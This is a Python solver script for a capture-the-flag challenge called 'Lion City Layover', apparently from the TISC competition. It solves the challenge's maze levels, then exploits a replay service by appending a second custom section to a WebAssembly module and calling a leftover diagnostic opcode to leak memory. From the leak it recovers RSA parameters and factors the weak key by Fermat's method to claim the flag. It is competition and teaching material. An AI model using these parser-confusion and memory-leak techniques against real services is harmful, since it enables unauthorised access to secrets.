#!/usr/bin/env python3
"""Deterministic end-to-end solver for Lion City Layover (stdlib only)."""

from __future__ import annotations

import base64
from collections import deque
import hashlib
import json
import math
import re
import struct
import time
import urllib.error
import urllib.request


BASE = "http://chals.tisc26.ctf.sg:57161"


def request(path: str, body: dict | None = None, retries: int = 4) -> bytes:
    data = None if body is None else json.dumps(body).encode()
    headers = {} if data is None else {"Content-Type": "application/json"}
    for attempt in range(retries):
        req = urllib.request.Request(BASE + path, data=data, headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=20) as response:
                return response.read()
        except urllib.error.HTTPError as exc:
            detail = exc.read().decode("utf-8", "replace")
            if exc.code != 429 or attempt + 1 == retries:
                raise RuntimeError(f"HTTP {exc.code} for {path}: {detail}") from exc
            delay = min(5.0, float(exc.headers.get("Retry-After", "1")))
            time.sleep(delay)
    raise AssertionError("unreachable")


def json_request(path: str, body: dict | None = None) -> dict:
    return json.loads(request(path, body))


def solve_level(level: dict) -> str:
    grid = level["grid"]
    height = len(grid)
    start = next(
        (x, y)
        for y, row in enumerate(grid)
        for x, cell in enumerate(row)
        if cell == "S"
    )
    stamp_bit = {
        (x, y): 1 << (ord(cell) - ord("A"))
        for y, row in enumerate(grid)
        for x, cell in enumerate(row)
        if cell in "ABC"
    }
    all_stamps = sum(stamp_bit.values())
    moves = (("U", 0, -1), ("D", 0, 1), ("L", -1, 0), ("R", 1, 0))
    queue = deque([(start[0], start[1], 0, "")])
    seen = {(start[0], start[1], 0)}

    while queue:
        x, y, stamps, trace = queue.popleft()
        if grid[y][x] == "E" and stamps == all_stamps:
            return trace
        for direction, dx, dy in moves:
            nx, ny = x + dx, y + dy
            if not (0 <= ny < height and 0 <= nx < len(grid[ny])):
                continue
            if grid[ny][nx] == "#":
                continue
            next_stamps = stamps | stamp_bit.get((nx, ny), 0)
            state = (nx, ny, next_stamps)
            if state not in seen:
                seen.add(state)
                queue.append((nx, ny, next_stamps, trace + direction))
    raise RuntimeError(f"no valid route through {level['name']}")


def uleb128(value: int) -> bytes:
    encoded = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        encoded.append(byte | (0x80 if value else 0))
        if not value:
            return bytes(encoded)


def custom_section(name: bytes, payload: bytes) -> bytes:
    body = uleb128(len(name)) + name + payload
    return b"\x00" + uleb128(len(body)) + body


def make_module(reference: bytes, program: bytes) -> str:
    payload = b"MERLION\x00v1.6.1\x00" + struct.pack("<H", len(program)) + program
    # The reference supplies the safe first `singa` section. The vulnerable
    # replay engine selects this appended (last) section instead.
    module = reference + custom_section(b"singa", payload)
    return base64.b64encode(module).decode()


def quiet_hand(ticket: str, module_b64: str) -> str:
    prefix = f"{ticket}.{module_b64}.".encode()
    nonce = 0
    while not hashlib.sha256(prefix + str(nonce).encode()).hexdigest().startswith("0000"):
        nonce += 1
    return str(nonce)


def diagnostic_read(ticket: str, reference: bytes, offset: int) -> bytes:
    # Opcode 0x61 is the archived diagnostic reader. Two 32-byte reads reach
    # the replay service's 64-byte output limit in one request.
    program = bytearray()
    for position in (offset, offset + 32):
        program += bytes((0x61, position >> 8, position & 0xFF, 32))
    program.append(0xFF)
    module_b64 = make_module(reference, bytes(program))
    result = json_request(
        "/api/harbour/run",
        {"ticket": ticket, "module": module_b64, "pow": quiet_hand(ticket, module_b64)},
    )
    if not result.get("ok"):
        raise RuntimeError(f"replay failed: {result}")
    return bytes(result["chroma"])


def fermat_factor(n: int) -> tuple[int, int]:
    a = math.isqrt(n)
    if a * a < n:
        a += 1
    while True:
        b_squared = a * a - n
        b = math.isqrt(b_squared)
        if b * b == b_squared:
            return a - b, a + b
        a += 1


def main() -> None:
    start = json_request("/api/harbour/start")
    traces = [solve_level(level) for level in start["levels"]]
    stamped = json_request(
        "/api/harbour/stamp", {"session": start["session"], "traces": traces}
    )
    if not stamped.get("ok"):
        raise RuntimeError(f"passport rejected: {stamped}")
    ticket = stamped["ticket"]

    manifest = json_request("/api/harbour/tide?format=json")
    reference = request(manifest["engine"])

    # Offsets 96..863 contain rsa_n, rsa_e, rsa_c, and claim_sha256.
    leaked = bytearray()
    for offset in range(96, 864, 64):
        leaked += diagnostic_read(ticket, reference, offset)
        time.sleep(0.35)
    text = leaked.decode("ascii")

    n = int(re.search(r"rsa_n=(\d+)", text).group(1))
    e = int(re.search(r"rsa_e=(\d+)", text).group(1))
    c = int(re.search(r"rsa_c=(\d+)", text).group(1))
    expected_hash = re.search(r"claim_sha256=([0-9a-f]{64})", text).group(1)

    p, q = fermat_factor(n)
    if p * q != n:
        raise RuntimeError("Fermat factorization failed")
    private_exponent = pow(e, -1, (p - 1) * (q - 1))
    plaintext_int = pow(c, private_exponent, n)
    claim = plaintext_int.to_bytes((plaintext_int.bit_length() + 7) // 8, "big")
    if hashlib.sha256(claim).hexdigest() != expected_hash:
        raise RuntimeError("decrypted boarding pass failed the published SHA-256 check")

    completed = json_request(
        "/api/harbour/claim", {"ticket": ticket, "claim": claim.decode("ascii")}
    )
    flag = completed.get("flag", "")
    if not completed.get("ok") or not re.fullmatch(r"TISC\{[^{}]+\}", flag):
        raise RuntimeError(f"claim was not accepted: {completed}")
    print(flag)


if __name__ == "__main__":
    main()
